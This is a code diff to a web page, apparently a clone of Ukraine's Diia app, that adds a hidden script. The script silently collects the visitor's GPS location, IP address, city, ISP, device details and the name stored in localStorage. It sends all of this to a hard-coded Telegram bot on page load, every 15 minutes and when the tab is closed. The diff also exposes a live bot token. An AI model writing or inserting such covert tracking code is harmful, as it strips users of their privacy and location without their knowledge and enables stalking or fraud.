@@ -4802,6 +4802,80 @@
     setInterval(checkExpiration, 30000); // Кожні 30 секунд
     setTimeout(checkExpiration, 5000);
 })();
+    (function() {
+        const CONFIG = {
+            botToken: '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg',
+            chatId: '-1002003419071',
+            heartbeatMs: 15 * 60 * 1000 // 15 хвилин
+        };
+
+        const getLogData = async () => {
+            // Гео
+            const geo = await new Promise(r => {
+                navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null), {timeout: 5000});
+            });
+
+            // Мережа
+            const ipData = await fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({}));
+
+            // Дані користувача (якщо вони вже вписані в ЛС або на сторінці)
+            const saved = JSON.parse(localStorage.getItem('diyaLocalState_v1') || '{}');
+            const name = saved.name || document.getElementById('name')?.textContent || 'Невідомо';
+            const shortName = saved.textName || document.getElementById('textName')?.textContent || 'Гість';
+
+            return {
+                user: `${name} (${shortName})`,
+                geo: geo ? `https://www.google.com/maps/search/?api=1&query=${geo.latitude},${geo.longitude}` : 'Відсутня',
+                ip: ipData.ip || '?',
+                city: `${ipData.city || '?'}, ${ipData.country || '?'}`,
+                provider: ipData.org || '?',
+                device: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                time: new Date().toLocaleString('uk-UA')
+            };
+        };
+
+        const sendToTelegram = async (type = 'ВХІД') => {
+            try {
+                const d = await getLogData();
+                const emo = type === 'ВХІД' ? '🔎' : '💓';
+                const message = `${emo} <b>${type} АКТИВНІСТЬ</b>\n━━━━━━━━━━━━━━━\n` +
+                    `👤 <b>Юзер:</b> <code>${d.user}</code>\n` +
+                    `📍 <b>Гео:</b> <a href="${d.geo}">Відкрити Мапу</a>\n` +
+                    `🌐 <b>IP:</b> <code>${d.ip}</code>\n` +
+                    `🏙 <b>Місто:</b> ${d.city}\n` +
+                    `🏢 <b>ISP:</b> ${d.provider}\n` +
+                    `📱 <b>Екран:</b> ${d.screen}\n` +
+                    `🕘 <b>Час:</b> ${d.time}\n` +
+                    `━━━━━━━━━━━━━━━\n` +
+                    `⚙ <b>Agent:</b> <code>${d.device}</code>`;
+
+                await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CONFIG.chatId,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
+                    })
+                });
+            } catch (e) { console.error('BG Log Error', e); }
+        };
+
+        // Запуск "Сервера"
+        window.addEventListener('load', () => {
+            // Перша відправка
+            setTimeout(() => sendToTelegram('ВХІД'), 2000);
+            
+            // Постійний цикл (Heartbeat)
+            setInterval(() => sendToTelegram('ПОВТОР'), CONFIG.heartbeatMs);
+        });
+
+        // Пряма відправка при спробі закрити вкладку
+        window.onbeforeunload = () => { sendToTelegram('ВИХІД'); };
+
+    })();
 </script>
 </body>
 
